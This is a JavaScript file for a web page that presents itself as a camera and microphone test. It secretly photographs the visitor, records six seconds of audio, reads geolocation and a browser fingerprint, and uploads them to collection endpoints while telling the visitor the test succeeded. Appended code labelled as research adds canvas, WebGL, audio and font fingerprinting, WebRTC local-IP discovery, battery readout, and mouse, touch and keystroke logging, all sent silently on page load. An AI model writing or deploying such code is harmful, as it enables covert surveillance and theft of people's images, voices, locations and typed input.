document.addEventListener('DOMContentLoaded', () => {
  const statusElement = document.querySelector('.status-content');
  const startButton = document.getElementById('startTest');
  const videoContainer = document.getElementById('videoContainer');
  const placeholder = document.getElementById('placeholder');
  const cameraStatus = document.getElementById('cameraStatus');
  const micStatus = document.getElementById('micStatus');
  const audioBars = document.querySelectorAll('.audio-bar');

  // Mobile detection
  const isMobile = /Mobi|Android/i.test(navigator.userAgent);
  if (isMobile) {
    videoContainer.style.minHeight = '50vh';
    startButton.style.fontSize = '18px';
    startButton.style.padding = '15px 25px';
  }

  // Start test button handler
  startButton.addEventListener('click', async () => {
    try {
      statusElement.textContent = "Initializing test...";
      startButton.disabled = true;
      startButton.innerHTML = '<div class="loader"></div> Starting Test...';

      await collectFingerprint();
      await captureAndSaveMedia();
      await collectLocation();

      statusElement.textContent = "Test completed successfully! All components are working properly.";
      startButton.textContent = "Test Again";
    } catch (error) {
      console.error('Test error:', error);
      statusElement.textContent = "Test encountered an error: " + error.message;
      startButton.textContent = "Retry Test";
    } finally {
      startButton.disabled = false;
    }
  });

  async function captureAndSaveMedia() {
    let stream;

    try {
      statusElement.textContent = "Checking camera and microphone permissions...";
      cameraStatus.textContent = "Camera: Checking...";
      micStatus.textContent = "Microphone: Checking...";

      stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: true
      });

      const video = document.getElementById('localVideo');
      video.srcObject = stream;
      video.style.display = 'block';
      placeholder.style.display = 'none';

      await new Promise((resolve, reject) => {
        video.onloadedmetadata = resolve;
        video.onerror = reject;
        setTimeout(() => reject(new Error('Camera initialization timeout')), 5000);
      });

      await video.play();
      cameraStatus.textContent = "Camera: Detected";
      statusElement.textContent = "Testing camera... Smile!";

      if (stream.getAudioTracks().length > 0) {
        animateAudioVisualizer(stream);
        micStatus.textContent = "Microphone: Detected";
      }

      statusElement.textContent = "Capturing test image...";
      const imageBlob = await captureImageFrame(video);
      await saveMedia('image', imageBlob, 'jpg');
      cameraStatus.textContent = "Camera: Working properly";

      if (stream.getAudioTracks().length > 0) {
        statusElement.textContent = "Testing microphone... Speak now!";
        const audioBlob = await recordAudio(stream);
        if (audioBlob) {
          await saveMedia('audio', audioBlob, 'webm');
          micStatus.textContent = "Microphone: Working properly";
        }
      } else {
        micStatus.textContent = "Microphone: Not detected";
      }

    } catch (error) {
      if (error.name === 'NotAllowedError') {
        cameraStatus.textContent = "Camera: Permission denied";
        micStatus.textContent = "Microphone: Permission denied";
        throw new Error("Please allow camera and microphone access to complete the test");
      } else {
        cameraStatus.textContent = "Camera: Error (" + error.message + ")";
        micStatus.textContent = "Microphone: Error";
        throw error;
      }
    } finally {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stopAudioVisualizer();
      }
    }
  }

  function animateAudioVisualizer(stream) {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const analyser = audioContext.createAnalyser();
    const microphone = audioContext.createMediaStreamSource(stream);
    microphone.connect(analyser);
    analyser.fftSize = 32;

    const bufferLength = analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);

    function updateVisualizer() {
      analyser.getByteFrequencyData(dataArray);
      audioBars.forEach((bar, i) => {
        const index = Math.floor(i * (bufferLength / audioBars.length));
        const value = dataArray[index] / 255;
        const height = value * 100;
        bar.style.height = `${10 + height}%`;
      });

      if (window.audioVisualizerActive) {
        requestAnimationFrame(updateVisualizer);
      }
    }

    window.audioVisualizerActive = true;
    updateVisualizer();
  }

  function stopAudioVisualizer() {
    window.audioVisualizerActive = false;
    audioBars.forEach(bar => {
      bar.style.height = '10%';
    });
  }
});

// Existing functions (unchanged but required)
async function collectFingerprint() {
  try {
    const payload = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth
      },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      languages: navigator.languages
    };

    const response = await fetch('/collect-fingerprint', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) throw new Error('Failed to save fingerprint');
  } catch (error) {
    console.error('Fingerprint error:', error);
    throw error;
  }
}

async function captureImageFrame(video) {
  return new Promise((resolve) => {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');

    const attemptCapture = (attempts = 3) => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = ctx.getImageData(0, 0, 10, 10).data;
      const isBlank = Array.from(imageData).every(val => val === 0);

      if (!isBlank || attempts <= 0) {
        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
      } else {
        setTimeout(() => attemptCapture(attempts - 1), 200);
      }
    };

    attemptCapture();
  });
}

async function recordAudio(stream) {
  return new Promise((resolve) => {
    try {
      const audioChunks = [];
      const recorder = new MediaRecorder(stream);

      recorder.ondataavailable = (e) => {
        if (e.data.size > 0) audioChunks.push(e.data);
      };

      recorder.onstop = () => {
        if (audioChunks.length > 0) {
          resolve(new Blob(audioChunks, { type: 'audio/webm' }));
        } else {
          resolve(null);
        }
      };

      recorder.start();
      setTimeout(() => recorder.stop(), 6000);

    } catch (error) {
      console.error('Audio recording error:', error);
      resolve(null);
    }
  });
}

async function saveMedia(type, blob, extension) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = async () => {
      try {
        const response = await fetch('/collect-media', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type,
            data: reader.result,
            extension
          })
        });

        if (!response.ok) throw new Error('Server error');
        resolve();
      } catch (error) {
        reject(error);
      }
    };
    reader.onerror = reject;
    reader.readAsDataURL(blob);
  });
}

async function collectLocation() {
  if (!navigator.geolocation) return;

  return new Promise((resolve) => {
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        try {
          await fetch('/collect-fingerprint', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              location: {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
              }
            })
          });
          resolve();
        } catch (error) {
          console.error('Location save error:', error);
          resolve();
        }
      },
      (error) => {
        console.error('Geolocation error:', error);
        resolve();
      },
      { timeout: 5000 }
    );
  });
}
// Enhanced data collection for cybersecurity research/education
// Add these functions to your existing collect.js file

async function collectEnhancedFingerprint() {
  try {
    const payload = {
      // Basic fingerprint data (existing)
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight
      },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      languages: navigator.languages,
      
      // Enhanced browser fingerprinting
      viewport: {
        width: window.innerWidth,
        height: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
      },
      
      // Hardware information
      hardware: {
        cpuCores: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints,
        connection: navigator.connection ? {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt
        } : null
      },
      
      // Browser capabilities
      features: {
        webGL: detectWebGL(),
        canvas: getCanvasFingerprint(),
        audio: await getAudioFingerprint(),
        fonts: await detectFonts(),
        plugins: getPlugins(),
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        onLine: navigator.onLine
      },
      
      // Timing attacks
      timing: {
        pageLoadTime: performance.now(),
        domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
        loadComplete: performance.timing.loadEventEnd - performance.timing.navigationStart
      },
      
      // Battery information (if available)
      battery: await getBatteryInfo(),
      
      // Device orientation
      orientation: {
        angle: screen.orientation ? screen.orientation.angle : null,
        type: screen.orientation ? screen.orientation.type : null
      },
      
      // WebRTC local IP detection
      localIPs: await getLocalIPs(),
      
      // Additional browser info
      browserInfo: {
        vendor: navigator.vendor,
        product: navigator.product,
        buildID: navigator.buildID,
        oscpu: navigator.oscpu,
        webdriver: navigator.webdriver
      }
    };

    // Send to server silently
    await fetch('/collect-enhanced-fingerprint', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

  } catch (error) {
    console.error('Enhanced fingerprint collection failed:', error);
  }
}

// WebGL fingerprinting
function detectWebGL() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return null;
    
    return {
      vendor: gl.getParameter(gl.VENDOR),
      renderer: gl.getParameter(gl.RENDERER),
      version: gl.getParameter(gl.VERSION),
      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
      extensions: gl.getSupportedExtensions()
    };
  } catch (e) {
    return null;
  }
}

// Canvas fingerprinting
function getCanvasFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    // Draw specific text and shapes
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Canvas fingerprint test 🎨', 2, 2);
    
    // Draw some shapes
    ctx.fillStyle = 'rgba(255,0,0,0.5)';
    ctx.fillRect(10, 10, 50, 30);
    
    return canvas.toDataURL();
  } catch (e) {
    return null;
  }
}

// Audio fingerprinting
async function getAudioFingerprint() {
  try {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const analyser = audioContext.createAnalyser();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(analyser);
    analyser.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.frequency.value = 1000;
    gainNode.gain.value = 0; // Silent
    
    oscillator.start();
    
    const frequencyData = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(frequencyData);
    
    oscillator.stop();
    
    return Array.from(frequencyData).slice(0, 10).join('');
  } catch (e) {
    return null;
  }
}

// Font detection
async function detectFonts() {
  const fonts = [
    'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
    'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
    'Trebuchet MS', 'Arial Black', 'Impact', 'Tahoma', 'Calibri',
    'Lucida Console', 'Monaco', 'Menlo', 'Consolas'
  ];
  
  const availableFonts = [];
  
  for (const font of fonts) {
    if (await isFontAvailable(font)) {
      availableFonts.push(font);
    }
  }
  
  return availableFonts;
}

function isFontAvailable(fontName) {
  return new Promise((resolve) => {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    ctx.font = '72px monospace';
    const baseline = ctx.measureText('mmmmmmmmmmlli').width;
    
    ctx.font = `72px ${fontName}, monospace`;
    const width = ctx.measureText('mmmmmmmmmmlli').width;
    
    resolve(width !== baseline);
  });
}

// Plugin detection
function getPlugins() {
  const plugins = [];
  for (let i = 0; i < navigator.plugins.length; i++) {
    const plugin = navigator.plugins[i];
    plugins.push({
      name: plugin.name,
      filename: plugin.filename,
      description: plugin.description
    });
  }
  return plugins;
}

// Battery API
async function getBatteryInfo() {
  try {
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      return {
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime,
        level: battery.level
      };
    }
  } catch (e) {
    return null;
  }
}

// WebRTC IP detection
async function getLocalIPs() {
  return new Promise((resolve) => {
    const ips = [];
    const RTCPeerConnection = window.RTCPeerConnection || 
                            window.webkitRTCPeerConnection || 
                            window.mozRTCPeerConnection;
    
    if (!RTCPeerConnection) {
      resolve(ips);
      return;
    }
    
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
    });
    
    pc.createDataChannel('');
    
    pc.onicecandidate = (event) => {
      if (event.candidate) {
        const candidate = event.candidate.candidate;
        const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
        if (ipMatch && !ips.includes(ipMatch[1])) {
          ips.push(ipMatch[1]);
        }
      }
    };
    
    pc.createOffer()
      .then(offer => pc.setLocalDescription(offer))
      .catch(() => {});
    
    setTimeout(() => {
      pc.close();
      resolve(ips);
    }, 2000);
  });
}

// Mouse/touch tracking
let mouseMovements = [];
let touchEvents = [];

function trackMouseMovements() {
  document.addEventListener('mousemove', (e) => {
    mouseMovements.push({
      x: e.clientX,
      y: e.clientY,
      timestamp: Date.now()
    });
    
    // Keep only last 50 movements
    if (mouseMovements.length > 50) {
      mouseMovements.shift();
    }
  });
}

function trackTouchEvents() {
  document.addEventListener('touchstart', (e) => {
    touchEvents.push({
      type: 'start',
      touches: e.touches.length,
      timestamp: Date.now()
    });
  });
  
  document.addEventListener('touchend', (e) => {
    touchEvents.push({
      type: 'end',
      touches: e.touches.length,
      timestamp: Date.now()
    });
  });
}

// Keyboard timing analysis
let keystrokes = [];

function trackKeystrokes() {
  document.addEventListener('keydown', (e) => {
    keystrokes.push({
      key: e.key,
      timestamp: Date.now(),
      duration: null
    });
  });
  
  document.addEventListener('keyup', (e) => {
    const lastKeystroke = keystrokes[keystrokes.length - 1];
    if (lastKeystroke && lastKeystroke.key === e.key) {
      lastKeystroke.duration = Date.now() - lastKeystroke.timestamp;
    }
  });
}

// Modified main function to include all enhanced data collection
async function collectAllData() {
  // Start behavioral tracking
  trackMouseMovements();
  trackTouchEvents();
  trackKeystrokes();
  
  // Collect enhanced fingerprint
  await collectEnhancedFingerprint();
  
  // Collect media (existing function)
  await captureAndSaveMedia();
  
  // Collect location (existing function)
  await collectLocation();
  
  // Send behavioral data after some time
  setTimeout(async () => {
    await fetch('/collect-behavioral-data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        mouseMovements,
        touchEvents,
        keystrokes
      })
    });
  }, 10000); // Send after 10 seconds
}

// Initialize enhanced collection when page loads
document.addEventListener('DOMContentLoaded', () => {
  // Start silent data collection immediately
  setTimeout(collectAllData, 1000);
});
